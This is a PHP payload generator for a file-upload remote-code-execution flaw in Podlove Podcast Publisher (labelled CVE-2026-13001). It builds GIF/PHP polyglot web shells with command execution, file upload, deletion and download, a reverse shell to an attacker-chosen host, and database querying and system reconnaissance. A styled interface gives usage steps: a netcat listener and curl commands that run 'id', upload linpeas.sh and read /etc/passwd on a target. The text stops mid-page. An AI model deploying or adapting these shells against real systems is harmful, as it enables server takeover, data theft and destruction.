<?php
/**
 * CVE-2026-13001 — Advanced Polyglot Payload Generator
 * Premium UI + Multi-mode RCE payloads
 *
 * Usage:
 *   php -S 0.0.0.0:9999 payload.php
 *   Then use the raw URL as --payload-url in the exploit
 */

$token  = $_GET['t'] ?? bin2hex(random_bytes(8));
$mode   = $_GET['mode'] ?? 'shell';
$rev_ip = $_GET['rev_ip'] ?? '127.0.0.1';
$rev_port = (int)($_GET['rev_port'] ?? '4444');
$rev_timeout = (int)($_GET['to'] ?? '30');

// ── GIF89a header ──
$gif_header  = "GIF89a";
$gif_header .= "\x3c\x00";
$gif_header .= "\x0c\x00";
$gif_header .= "\xf7";
$gif_header .= "\x00\x00\x00";
$gif_header .= str_repeat("\x00\x00\x00", 256);
$gif_header .= "\x21\xf9\x04\x01\x00\x00\x00\x00";
$gif_header .= "\x2c\x00\x00\x00\x00";
$gif_header .= "\x3c\x00\x0c\x00";
$gif_header .= "\x00";
$gif_header .= "\x02\x0c\x8c\x01\x00\x00";

// ── Common RCE stub ──
$rce_stub = '?>'
    . '<?php '
    . 'error_reporting(0);$t="' . $token . '";'
    . 'if(!isset($_GET["t"])||!hash_equals($t,$_GET["t"])){http_response_code(404);die();}';

// ── Shell Mode ──
$shell_mode = $rce_stub
    . '$d=__DIR__;'
    . 'if(isset($_GET["c"])){$_c=$_GET["c"]." 2>&1";echo"C|";'
    . '$r="";'
    . 'if(function_exists("system")){ob_start();system($_c);$r=ob_get_clean();}'
    . 'elseif(function_exists("passthru")){ob_start();passthru($_c);$r=ob_get_clean();}'
    . 'elseif(function_exists("exec")){exec($_c,$_o);$r=implode("\n",$_o);}'
    . 'elseif(function_exists("shell_exec")){$r=shell_exec($_c);}'
    . 'elseif(function_exists("popen")){$_h=popen($_c,"r");if($_h){while(!feof($_h))$r.=fread($_h,4096);pclose($_h);}}'
    . 'elseif(function_exists("proc_open")){$_ds=[["pipe","r"],["pipe","w"],["pipe","w"]];'
    . '$_p=proc_open($_c,$_ds,$_ps);if(is_resource($_p)){$r=stream_get_contents($_ps[1]);fclose($_ps[1]);proc_close($_p);}}'
    . 'elseif(function_exists("pcntl_exec")){$_a=explode(" ",$_c);'
    . 'pcntl_exec($_a[0],array_slice($_a,1));$r="PCNTL_EXEC";}'
    . 'else{$r="NO_EXEC_AVAIL";}'
    . 'echo$r."|E";die();}'
    . 'if(isset($_FILES["f"])){$_n=(isset($_POST["n"])&&$_POST["n"]!=="")?$_POST["n"]:$_FILES["f"]["name"];'
    . '$_n=preg_replace("/[\\x00-\\x1f\\x7f-\\xff\\/\\\\]/","",$_n);'
    . 'if($_n===""){$_n=bin2hex(random_bytes(4)).".php";}'
    . 'if(move_uploaded_file($_FILES["f"]["tmp_name"],"$d/$_n")){die("OK|$_n");}'
    . 'die("ERR_UPLOAD");}'
    . 'if(isset($_GET["del"])){$_df=basename($_GET["del"]);$_fp="$d/$_df";'
    . 'if(is_file($_fp)){unlink($_fp);die("DEL|$_df");}'
    . 'if(is_dir($_fp)){@array_map("unlink",glob("$_fp/*"));@rmdir($_fp);die("RMDIR|$_df");}'
    . 'die("NOT_FOUND");}'
    . 'if(isset($_GET["dl"])){$_df=basename($_GET["dl"]);$_fp="$d/$_df";'
    . 'if(is_file($_fp)){header("Content-Type: application/octet-stream");'
    . 'header("Content-Disposition: attachment; filename=\"$_df\"");'
    . 'readfile($_fp);die();}}'
    . 'if(isset($_GET["cat"])){$_df=basename($_GET["cat"]);$_fp="$d/$_df";'
    . 'if(is_file($_fp)){echo"<pre>".htmlspecialchars(file_get_contents($_fp))."</pre>";die();}'
    . 'echo"NOT_FOUND";die();}'
    . '$_fl="";foreach(scandir($d)as$_ef){'
    . 'if($_ef=="."||$_ef=="..")continue;'
    . '$_is_d=is_dir("$d/$_ef");'
    . '$_ico=$_is_d?"[DIR]":"[FILE]";'
    . '$_sz=$_is_d?"--":filesize("$d/$_ef")."b";'
    . '$_fl.="<tr><td>$_ico</td>"'
    . '."<td><a href=\"?t=$t&cat=".urlencode($_ef)."\">".htmlspecialchars($_ef)."</a></td>"'
    . '."<td>$_sz</td>"'
    . '."<td><a href=\"?t=$t&dl=".urlencode($_ef)."\">[dl]</a> "'
    . '."<a href=\"?t=$t&del=".urlencode($_ef)."\" onclick=\"return confirm(\'Delete?\');\">[del]</a></td></tr>";}'
    . 'echo"<html><head><title>CVE-2026-13001 Shell</title>"'
    . '."<style>'
    . 'body{background:#0a0a0a;color:#00ff41;font-family:Consolas,monospace;padding:20px}'
    . 'a{color:#00ff41;text-decoration:none}a:hover{color:#fff}'
    . 'input,button,select{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:6px 10px;font-family:monospace;font-size:13px}'
    . 'button:hover{background:#0f0;color:#000;cursor:pointer}'
    . 'table{border-collapse:collapse;width:100%}td{padding:4px 8px;border-bottom:1px solid #333}tr:hover{background:#1a1a1a}'
    . '.badge{color:#888;font-size:12px}#out{background:#111;padding:10px;border:1px solid #333;min-height:30px;font-size:13px}'
    . '</style></head><body>"'
    . '."<h2>CVE-2026-13001 Web Shell</h2>"'
    . '."<p class=badge>Token: $t | Dir: $d | Server: {$_SERVER[\'SERVER_SOFTWARE\']}</p>"'
    . '."<hr>"'
    . '."<h3>Upload</h3>"'
    . '."<form method=post enctype=multipart/form-data>"'
    . '."<input type=file name=f> <input type=text name=n placeholder=\"rename (opt)\">"'
    . '."<button>Upload</button></form>"'
    . '."<h3>Command</h3>"'
    . '."<form method=get onsubmit=\"return execCmd(this)\">"'
    . '."<input type=hidden name=t value=$t>"'
    . '."<input name=c placeholder=\"command\" style=\"width:400px\">"'
    . '."<button>Exec</button></form>"'
    . '."<div id=out><pre id=res></pre></div>"'
    . '."<script>'
    . 'function execCmd(f){var x=new XMLHttpRequest();'
    . 'x.onload=function(){document.getElementById(\'res\').textContent=this.responseText;};'
    . 'x.open(\'GET\',\'?t=$t&c=\'+encodeURIComponent(f.c.value));x.send();'
    . 'return false;}'
    . '</script>"'
    . '."<hr><h3>Files</h3><table>$_fl</table></body></html>";'
    . '?>';

// ── Reverse Shell Mode ──
$rev_shell_mode = $rce_stub
    . '$rev_ip="' . $rev_ip . '";'
    . '$rev_port=' . $rev_port . ';'
    . '$rev_timeout=' . $rev_timeout . ';'
    . '$s=null;$_err="";'
    . 'if(function_exists("fsockopen")){$s=@fsockopen($rev_ip,$rev_port,$_en,$_es,$rev_timeout);if(!$s)$_err.="fsockopen:$_es;";}'
    . 'if(!$s&&function_exists("socket_create")){'
    . '$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);'
    . 'if($s){@socket_set_option($s,SOL_SOCKET,SO_RCVTIMEO,["sec"=>$rev_timeout,"usec"=>0]);'
    . '@socket_connect($s,$rev_ip,$rev_port)||($s=null&&$_err.="socket_connect;");}}'
    . 'if(!$s&&function_exists("stream_socket_client")){'
    . '$s=@stream_socket_client("tcp://$rev_ip:$rev_port",$_en,$_es,$rev_timeout);if(!$s)$_err.="stream:$_es;";}'
    . 'if($s){'
    . 'fwrite($s,"[+] CVE-2026-13001 reverse shell connected\n");'
    . 'fwrite($s,"[+] Target: ".gethostname()." | ".php_uname("s")." ".php_uname("r")."\n");'
    . 'fwrite($s,"[+] Working dir: ".getcwd()."\n\n");'
    . '$_start=time();'
    . 'while(!feof($s)&&(time()-$_start)<3600){'
    . 'fwrite($s,"$ ");$_c=trim(fgets($s));'
    . 'if($_c===false||$_c===""||$_c==="exit"||$_c==="quit")break;'
    . '$_c.=" 2>&1";$_o="";'
    . 'if(function_exists("system")){ob_start();system($_c);$_o=ob_get_clean();}'
    . 'elseif(function_exists("passthru")){ob_start();passthru($_c);$_o=ob_get_clean();}'
    . 'elseif(function_exists("exec")){exec($_c,$_ol);$_o=implode("\n",$_ol);}'
    . 'elseif(function_exists("shell_exec")){$_o=shell_exec($_c);}'
    . 'else{$_o="NO_EXEC\n";}'
    . 'fwrite($s,$_o);}'
    . 'fclose($s);die("[+] Reverse shell session ended\n");}'
    . 'die("[-] Failed to connect to $rev_ip:$rev_port — $_err");'
    . '?>';

// ── Beast Mode ──
$beast_mode = $rce_stub
    . '$d=__DIR__;'
    . 'function _x($c){$c.=" 2>&1";$r="";'
    . 'if(function_exists("system")){ob_start();system($c);$r=ob_get_clean();}'
    . 'elseif(function_exists("passthru")){ob_start();passthru($c);$r=ob_get_clean();}'
    . 'elseif(function_exists("exec")){exec($c,$o);$r=implode("\n",$o);}'
    . 'elseif(function_exists("shell_exec")){$r=shell_exec($c);}'
    . 'else{$r="NO_EXEC";}return$r;}'
    . 'if(isset($_GET["c"])){echo"C|"._x($_GET["c"])."|E";die();}'
    . 'if(isset($_FILES["f"])){$_n=preg_replace("/[\\x00-\\x1f\\x7f-\\xff\\/\\\\]/","",$_FILES["f"]["name"]);'
    . 'if($_n===""){$_n=bin2hex(random_bytes(4)).".php";}'
    . 'if(move_uploaded_file($_FILES["f"]["tmp_name"],"$d/$_n")){die("OK|$_n");}}'
    . 'if(isset($_GET["del"])){$_df=basename($_GET["del"]);$_fp="$d/$_df";'
    . 'is_file($_fp)?unlink($_fp):(is_dir($_fp)?@rmdir($_fp):0);die("DEL|$_df");}'
    . 'if(isset($_GET["rev"])){$_ip=$_GET["rev"];$_p=(int)($_GET["p"]??4444);'
    . '$_s=@fsockopen($_ip,$_p,$_en,$_es,15);'
    . 'if($_s){fwrite($_s,"[+] Beast shell connected\n");$_start=time();'
    . 'while(!feof($_s)&&(time()-$_start)<3600){fwrite($_s,"# ");'
    . '$_c=trim(fgets($_s));if($_c===""||$_c==="exit"||$_c===false)break;'
    . 'fwrite($_s,_x($_c));}fclose($_s);}'
    . 'die("REV|$_ip:$_p");}'
    . 'if(isset($_GET["db"])){$_db=$_GET["db"]??"mysql";$_h=$_GET["host"]??"localhost";'
    . '$_u=$_GET["user"]??"root";$_p=$_GET["pass"]??"";$_n=$_GET["name"]??"";'
    . '$_q=$_GET["q"]??"SELECT VERSION()";$_r="";'
    . 'if($_db=="mysql"&&class_exists("mysqli")){'
    . '$_m=@new mysqli($_h,$_u,$_p,$_n);'
    . 'if(!$_m->connect_error){$_res=$_m->query($_q);'
    . 'if($_res){while($_row=$_res->fetch_assoc()){$_r.=json_encode($_row)."\n";}}'
    . 'else{$_r=$_m->error;}$_m->close();}}'
    . 'elseif($_db=="pgsql"&&function_exists("pg_connect")){'
    . '$_cs="host=$_h user=$_u password=$_p dbname=$_n";'
    . '$_c=@pg_connect($_cs);'
    . 'if($_c){$_res=@pg_query($_c,$_q);'
    . 'if($_res){while($_row=pg_fetch_assoc($_res)){$_r.=json_encode($_row)."\n";}}'
    . 'else{$_r=pg_last_error($_c);}pg_close($_c);}}'
    . 'elseif($_db=="sqlite"&&class_exists("SQLite3")){'
    . '$_s=new SQLite3($_n);$_res=$_s->query($_q);'
    . 'if($_res){while($_row=$_res->fetchArray(SQLITE3_ASSOC)){$_r.=json_encode($_row)."\n";}}'
    . 'else{$_r=$_s->lastErrorMsg();}}'
    . 'else{$_r="No DB driver available for $_db";}'
    . 'die("DB|$_r");}'
    . 'if(isset($_GET["cat"])){$_df=basename($_GET["cat"]);$_fp="$d/$_df";'
    . 'die(is_file($_fp)?file_get_contents($_fp):"NOT_FOUND");}'
    . 'if(isset($_GET["info"])){'
    . '$_info=["dir"=>$d,"uname"=>php_uname(),"server"=>$_SERVER["SERVER_SOFTWARE"]??"N/A",'
    . '"php_version"=>phpversion(),"disabled_functions"=>ini_get("disable_functions"),'
    . '"safe_mode"=>ini_get("safe_mode")??"off","user"=>get_current_user(),'
    . '"uid"=>function_exists("posix_getuid")?posix_getuid():0,'
    . '"gid"=>function_exists("posix_getgid")?posix_getgid():0,'
    . '"exec_avail"=>function_exists("system")||function_exists("passthru")||function_exists("exec")||function_exists("shell_exec"),'
    . '"open_basedir"=>ini_get("open_basedir")?:false,'
    . '"allow_url_fopen"=>ini_get("allow_url_fopen")?:false];'
    . 'header("Content-Type: application/json");die(json_encode($_info));}'
    . '$_fl="";foreach(scandir($d)as$_ef){'
    . 'if($_ef=="."||$_ef=="..")continue;'
    . '$_is_d=is_dir("$d/$_ef")?"[DIR]":"[FILE]";$_sz=$_is_d?"--":filesize("$d/$_ef")."b";'
    . '$_fl.="<tr><td>$_is_d</td><td>".htmlspecialchars($_ef)."</td><td>$_sz</td>"'
    . '."<td><a href=\"?t=$t&cat=".urlencode($_ef)."\">[cat]</a> "'
    . '."<a href=\"?t=$t&del=".urlencode($_ef)."\">[del]</a></td></tr>";}'
    . 'echo"<html><head><title>Beast Shell</title>"'
    . '."<style>'
    . 'body{background:#0d0d0d;color:#0f0;font:14px Consolas;padding:20px}'
    . 'a{color:#0f0}input,select,button{background:#222;color:#0f0;border:1px solid #0f0;padding:4px 8px;font:13px monospace}'
    . 'td{padding:3px 8px;border-bottom:1px solid #333}'
    . '.sec{border:1px solid #333;padding:12px;margin:8px 0;background:#111}'
    . '</style></head><body>"'
    . '."<h2>CVE-2026-13001 — Beast Shell</h2>"'
    . '."<p class=badge>Token: $t | Dir: $d | UID:".(function_exists("posix_getuid")?posix_getuid():"?")."</p>"'
    . '."<div class=sec><h3>Command</h3><form method=get>"'
    . '."<input type=hidden name=t value=$t>"'
    . '."<input name=c style=width:400px placeholder=\"cmd\"><button>Exec</button></form></div>"'
    . '."<div class=sec><h3>Reverse Shell</h3><form method=get>"'
    . '."<input type=hidden name=t value=$t>"'
    . '."<input name=rev placeholder=\"LHOST\" style=width:150px>:"'
    . '."<input name=p value=4444 style=width:60px placeholder=\"PORT\">"'
    . '."<button>Connect</button></form></div>"'
    . '."<div class=sec><h3>DB Query</h3><form method=get>"'
    . '."<input type=hidden name=t value=$t>"'
    . '."<select name=db><option value=mysql>MySQL</option><option value=pgsql>PostgreSQL</option><option value=sqlite>SQLite</option></select>"'
    . '."<input name=host placeholder=host value=localhost style=width:100px>"'
    . '."<input name=user placeholder=user value=root style=width:80px>"'
    . '."<input name=pass placeholder=pass type=password style=width:80px>"'
    . '."<input name=name placeholder=dbname style=width:100px>"'
    . '."<input name=q placeholder=\"SELECT VERSION()\" style=width:200px>"'
    . '."<button>Query</button></form></div>"'
    . '."<div class=sec><h3>Files</h3><table>$_fl</table></div>"'
    . '."<p><a href=\"?t=$t&info\">[System Info JSON]</a></p>"'
    . '."</body></html>";'
    . '?>';

// ── Select mode ──
switch ($mode) {
    case 'rev':   $php_shell = $rev_shell_mode; break;
    case 'beast': $php_shell = $beast_mode; break;
    default:      $php_shell = $shell_mode; break;
}

$polyglot = $gif_header . $php_shell;

// ── Serve raw polyglot ──
if (isset($_GET['raw'])) {
    header('Content-Type: image/gif');
    header('Content-Length: ' . strlen($polyglot));
    header('Cache-Control: no-store, no-cache, must-revalidate');
    header('X-Payload-Token: ' . $token);
    header('X-Payload-Mode: ' . $mode);
    echo $polyglot;
    exit;
}

// ──── PREMIUM UI ────
$host = $_SERVER['HTTP_HOST'] ?? 'localhost:9999';
$qs_mode = htmlspecialchars($mode);
$qs_token = htmlspecialchars($token);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CVE-2026-13001 — Polyglot Payload Generator</title>
<style>
/* ── Reset & Base ── */
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}

:root {
    --bg-primary: #0a0e17;
    --bg-secondary: #111827;
    --bg-card: #1a2332;
    --bg-card-hover: #1e2a3d;
    --border: #2a3a52;
    --border-focus: #00ff41;
    --text-primary: #e2e8f0;
    --text-secondary: #94a3b8;
    --text-muted: #64748b;
    --accent: #00ff41;
    --accent-dim: #00cc33;
    --accent-glow: rgba(0,255,65,0.15);
    --danger: #ff3355;
    --warning: #ffaa00;
    --info: #00ccff;
    --radius: 8px;
    --transition: 0.2s ease;
}

html { scroll-behavior: smooth }

body {
    background: var(--bg-primary);
    color: var(--text-primary);
    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    line-height: 1.6;
    min-height: 100vh;
}

/* ── Cyber Grid Background ── */
body::before {
    content: '';
    position: fixed;
    inset: 0;
    background-image: 
        linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
    z-index: 0;
}

/* ── Layout ── */
.container {
    max-width: 1100px;
    margin: 0 auto;
    padding: 24px 20px;
    position: relative;
    z-index: 1;
}

/* ── Header ── */
.header {
    text-align: center;
    padding: 32px 0 24px;
    border-bottom: 1px solid var(--border);
    margin-bottom: 28px;
}

.header-badge {
    display: inline-block;
    background: var(--accent-glow);
    border: 1px solid var(--accent);
    color: var(--accent);
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    padding: 4px 14px;
    border-radius: 20px;
    margin-bottom: 12px;
}

.header h1 {
    font-size: 28px;
    font-weight: 700;
    letter-spacing: -0.5px;
    color: var(--text-primary);
}

.header h1 span {
    color: var(--accent);
}

.header p {
    color: var(--text-secondary);
    font-size: 15px;
    margin-top: 6px;
}

/* ── Cards ── */
.card {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 20px 24px;
    margin-bottom: 16px;
    transition: border-color var(--transition);
}

.card:hover {
    border-color: rgba(0,255,65,0.2);
}

.card-header {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 16px;
    font-size: 15px;
    font-weight: 600;
    color: var(--text-primary);
}

.card-header .icon {
    width: 22px;
    height: 22px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 4px;
    font-size: 14px;
}

.card-header .icon.green { background: var(--accent-glow); color: var(--accent); }
.card-header .icon.blue { background: rgba(0,204,255,0.12); color: var(--info); }
.card-header .icon.red { background: rgba(255,51,85,0.12); color: var(--danger); }
.card-header .icon.yellow { background: rgba(255,170,0,0.12); color: var(--warning); }

/* ── Mode Tabs ── */
.mode-tabs {
    display: flex;
    gap: 4px;
    background: var(--bg-secondary);
    border-radius: var(--radius);
    padding: 4px;
    margin-bottom: 20px;
    flex-wrap: wrap;
}

.mode-tab {
    flex: 1;
    min-width: 100px;
    text-align: center;
    padding: 10px 16px;
    border-radius: 6px;
    font-size: 13px;
    font-weight: 600;
    color: var(--text-secondary);
    text-decoration: none;
    transition: all var(--transition);
    cursor: pointer;
    border: none;
    background: none;
}

.mode-tab:hover {
    color: var(--text-primary);
    background: rgba(255,255,255,0.05);
}

.mode-tab.active {
    background: var(--accent);
    color: #000;
    box-shadow: 0 0 20px var(--accent-glow);
}

.mode-tab .sub {
    display: block;
    font-size: 10px;
    font-weight: 400;
    opacity: 0.7;
    margin-top: 2px;
}

/* ── Form Elements ── */
.form-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
    gap: 12px;
}

.form-group {
    display: flex;
    flex-direction: column;
    gap: 4px;
}

.form-group label {
    font-size: 12px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    color: var(--text-secondary);
}

input, select, textarea {
    background: var(--bg-secondary);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 8px 12px;
    font-size: 13px;
    font-family: 'JetBrains Mono', 'Consolas', monospace;
    color: var(--text-primary);
    transition: border-color var(--transition), box-shadow var(--transition);
    width: 100%;
}

input:focus, select:focus, textarea:focus {
    outline: none;
    border-color: var(--accent);
    box-shadow: 0 0 0 3px var(--accent-glow);
}

input::placeholder {
    color: var(--text-muted);
    opacity: 0.6;
}

/* ── Buttons ── */
.btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    padding: 8px 18px;
    border-radius: 6px;
    font-size: 13px;
    font-weight: 600;
    font-family: inherit;
    border: none;
    cursor: pointer;
    transition: all var(--transition);
    text-decoration: none;
    line-height: 1.4;
}

.btn-primary {
    background: var(--accent);
    color: #000;
}

.btn-primary:hover {
    background: var(--accent-dim);
    box-shadow: 0 0 24px var(--accent-glow);
    transform: translateY(-1px);
}

.btn-secondary {
    background: var(--bg-secondary);
    color: var(--text-primary);
    border: 1px solid var(--border);
}

.btn-secondary:hover {
    background: var(--bg-card);
    border-color: var(--text-secondary);
}

.btn-danger {
    background: rgba(255,51,85,0.12);
    color: var(--danger);
    border: 1px solid rgba(255,51,85,0.3);
}

.btn-danger:hover {
    background: rgba(255,51,85,0.2);
}

.btn-group {
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
    margin-top: 8px;
}

.btn-lg {
    padding: 12px 28px;
    font-size: 15px;
}

/* ── Info Grid ── */
.info-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 12px;
}

.info-item {
    background: var(--bg-secondary);
    border-radius: 6px;
    padding: 10px 14px;
}

.info-item .label {
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    color: var(--text-muted);
    font-weight: 600;
}

.info-item .value {
    font-size: 14px;
    font-weight: 600;
    color: var(--text-primary);
    margin-top: 2px;
    word-break: break-all;
}

.info-item .value.mono {
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
}

/* ── Code Block ── */
.code-block {
    background: var(--bg-secondary);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 14px 16px;
    font-family: 'JetBrains Mono', 'Consolas', monospace;
    font-size: 13px;
    line-height: 1.7;
    overflow-x: auto;
    white-space: pre;
    color: var(--accent);
    position: relative;
}

.code-block .comment {
    color: var(--text-muted);
}

.code-block .keyword {
    color: var(--info);
}

.code-block .string {
    color: var(--warning);
}

.copy-btn {
    position: absolute;
    top: 8px;
    right: 8px;
    background: var(--bg-card);
    border: 1px solid var(--border);
    color: var(--text-secondary);
    padding: 4px 10px;
    border-radius: 4px;
    font-size: 11px;
    cursor: pointer;
    transition: all var(--transition);
}

.copy-btn:hover {
    background: var(--accent);
    color: #000;
    border-color: var(--accent);
}

/* ── Feature Table ── */
.feature-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
}

.feature-table th {
    text-align: left;
    padding: 8px 12px;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    color: var(--text-muted);
    border-bottom: 1px solid var(--border);
    font-weight: 600;
}

.feature-table td {
    padding: 8px 12px;
    border-bottom: 1px solid rgba(42,58,82,0.4);
}

.feature-table tr:hover td {
    background: rgba(255,255,255,0.02);
}

.feature-table .check {
    color: var(--accent);
}

.feature-table .cross {
    color: var(--text-muted);
    opacity: 0.4;
}

/* ── Footer ── */
.footer {
    text-align: center;
    padding: 24px 0;
    border-top: 1px solid var(--border);
    margin-top: 32px;
    color: var(--text-muted);
    font-size: 12px;
}

/* ── Toast / Notif ── */
.toast {
    position: fixed;
    bottom: 24px;
    right: 24px;
    background: var(--bg-card);
    border: 1px solid var(--accent);
    border-radius: var(--radius);
    padding: 12px 20px;
    font-size: 13px;
    color: var(--accent);
    box-shadow: 0 4px 24px rgba(0,0,0,0.4);
    transform: translateY(80px);
    opacity: 0;
    transition: all 0.3s ease;
    z-index: 999;
}

.toast.show {
    transform: translateY(0);
    opacity: 1;
}

/* ── Status Badge ── */
.badge {
    display: inline-block;
    font-size: 11px;
    font-weight: 600;
    padding: 2px 10px;
    border-radius: 12px;
    letter-spacing: 0.3px;
}

.badge-green {
    background: var(--accent-glow);
    color: var(--accent);
}

.badge-gray {
    background: rgba(100,116,139,0.12);
    color: var(--text-muted);
}

/* ── Responsive ── */
@media (max-width: 640px) {
    .container { padding: 16px 12px; }
    .header h1 { font-size: 22px; }
    .form-grid { grid-template-columns: 1fr; }
    .info-grid { grid-template-columns: 1fr 1fr; }
    .mode-tab { min-width: 80px; font-size: 12px; padding: 8px 10px; }
    .card { padding: 16px; }
}

/* ── Animations ── */
@keyframes fadeIn {
    from { opacity: 0; transform: translateY(6px); }
    to { opacity: 1; transform: translateY(0); }
}

.card { animation: fadeIn 0.3s ease forwards; }
.card:nth-child(2) { animation-delay: 0.05s; }
.card:nth-child(3) { animation-delay: 0.1s; }
</style>
</head>
<body>

<div class="container">

    <!-- Header -->
    <header class="header">
        <div class="header-badge">⚡ CVE-2026-13001</div>
        <h1>Polyglot <span>Payload Generator</span></h1>
        <p>GIF89a + PHP polyglot for <strong>Podlove Podcast Publisher</strong> file upload RCE</p>
    </header>

    <!-- Mode Selector -->
    <div class="mode-tabs">
        <a href="?mode=shell" class="mode-tab <?= $mode==='shell'?'active':'' ?>">
            🖥️ Web Shell
            <span class="sub">RCE + File Manager</span>
        </a>
        <a href="?mode=rev" class="mode-tab <?= $mode==='rev'?'active':'' ?>">
            🔌 Reverse Shell
            <span class="sub">Interactive Session</span>
        </a>
        <a href="?mode=beast" class="mode-tab <?= $mode==='beast'?'active':'' ?>">
            🧬 Beast Shell
            <span class="sub">All-in-One</span>
        </a>
    </div>

    <!-- Payload Info -->
    <div class="card">
        <div class="card-header">
            <span class="icon green">📦</span>
            Payload Overview
        </div>
        <div class="info-grid">
            <div class="info-item">
                <div class="label">Mode</div>
                <div class="value">
                    <span class="badge badge-green"><?= htmlspecialchars(ucfirst($mode)) ?></span>
                </div>
            </div>
            <div class="info-item">
                <div class="label">Token</div>
                <div class="value mono"><?= htmlspecialchars($token) ?></div>
            </div>
            <div class="info-item">
                <div class="label">Size</div>
                <div class="value"><?= number_format(strlen($polyglot)) ?> bytes</div>
            </div>
            <div class="info-item">
                <div class="label">Type</div>
                <div class="value mono">image/gif + application/php</div>
            </div>
        </div>
    </div>

    <!-- Config Generator (mode-specific) -->
    <?php if ($mode === 'rev'): ?>
    <div class="card">
        <div class="card-header">
            <span class="icon blue">🎯</span>
            Reverse Shell Configuration
        </div>
        <form method="get" action="" id="revForm">
            <input type="hidden" name="mode" value="rev">
            <div class="form-grid">
                <div class="form-group">
                    <label>LHOST (Your IP)</label>
                    <input type="text" name="rev_ip" value="<?= htmlspecialchars($rev_ip) ?>" placeholder="192.168.1.100">
                </div>
                <div class="form-group">
                    <label>LPORT</label>
                    <input type="number" name="rev_port" value="<?= $rev_port ?>" placeholder="4444" min="1" max="65535">
                </div>
                <div class="form-group">
                    <label>Timeout (s)</label>
                    <input type="number" name="to" value="<?= $rev_timeout ?>" placeholder="30" min="5" max="120">
                </div>
                <div class="form-group" style="justify-content:flex-end">
                    <label>&nbsp;</label>
                    <button type="submit" class="btn btn-primary">Update Config</button>
                </div>
            </div>
        </form>

        <div style="margin-top:12px;padding:10px 14px;background:var(--bg-secondary);border-radius:6px;font-size:13px">
            <strong style="color:var(--text-secondary)">Listener command:</strong>
            <span style="font-family:monospace;color:var(--accent)">nc -lnvp <?= $rev_port ?></span>
        </div>
    </div>
    <?php endif; ?>

    <!-- Token Config -->
    <div class="card">
        <div class="card-header">
            <span class="icon yellow">🔑</span>
            Token Configuration
        </div>
        <form method="get" action="" style="display:flex;gap:8px;align-items:end;flex-wrap:wrap">
            <input type="hidden" name="mode" value="<?= $qs_mode ?>">
            <div style="flex:1;min-width:180px">
                <label style="font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;color:var(--text-secondary);display:block;margin-bottom:4px">Auth Token</label>
                <input type="text" name="t" value="<?= $qs_token ?>" placeholder="auto-generated" style="font-family:monospace">
            </div>
            <button type="submit" class="btn btn-secondary">Set Token</button>
            <a href="?mode=<?= $qs_mode ?>&t=<?= bin2hex(random_bytes(8)) ?>" class="btn btn-secondary">🔄 Randomize</a>
        </form>
    </div>

    <!-- Download / Copy -->
    <div class="card">
        <div class="card-header">
            <span class="icon green">⬇️</span>
            Download Payload
        </div>
        <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">
            Use this URL as <code>--payload-url</code> in the exploit, or download the polyglot file directly.
        </p>

        <div style="position:relative">
            <div class="code-block" id="rawUrl">http://<?= htmlspecialchars($host) ?>/?raw<?= $mode !== 'shell' ? '&mode=' . $qs_mode : '' ?>&t=<?= $qs_token ?></div>
            <button class="copy-btn" onclick="copyUrl()">📋 Copy</button>
        </div>

        <div class="btn-group">
            <a href="?raw<?= $mode !== 'shell' ? '&mode=' . $qs_mode : '' ?>&t=<?= $qs_token ?>" class="btn btn-primary btn-lg" download="payload.gif">
                ⬇️ Download payload.gif
            </a>
            <a href="?raw=1&mode=<?= $qs_mode ?>&t=<?= $qs_token ?>" class="btn btn-secondary" target="_blank">
                🔍 Preview Raw
            </a>
        </div>
    </div>

    <!-- Usage -->
    <div class="card">
        <div class="card-header">
            <span class="icon blue">📖</span>
            Usage Examples
        </div>

        <div style="margin-bottom:12px">
            <strong style="font-size:13px;color:var(--text-secondary)">1. Start the payload server:</strong>
            <div style="position:relative;margin-top:4px">
                <div class="code-block">php -S 0.0.0.0:9999 payload.php</div>
                <button class="copy-btn" onclick="copyText('php -S 0.0.0.0:9999 payload.php')">📋</button>
            </div>
        </div>

        <div style="margin-bottom:12px">
            <strong style="font-size:13px;color:var(--text-secondary)">2. Use as payload URL in exploit:</strong>
            <div style="position:relative;margin-top:4px">
                <div class="code-block" id="payloadUrl">http://<?= htmlspecialchars($host) ?>/?raw<?= $mode !== 'shell' ? '&mode=' . $qs_mode : '' ?>&t=<?= $qs_token ?></div>
                <button class="copy-btn" onclick="copyUrl()">📋</button>
            </div>
        </div>

        <div>
            <strong style="font-size:13px;color:var(--text-secondary)">3. After upload — interact with shell:</strong>
            <div style="position:relative;margin-top:4px">
                <div class="code-block"><span class="comment"># Command execution</span>
curl "http://target/uploads/payload.gif?t=<?= $qs_token ?>&c=id"

<span class="comment"># Upload additional tools</span>
curl -F "f=@linpeas.sh" "http://target/uploads/payload.gif?t=<?= $qs_token ?>"

<span class="comment"># Read files</span>
curl "http://target/uploads/payload.gif?t=<?= $qs_token ?>&cat=/etc/passwd"</div>
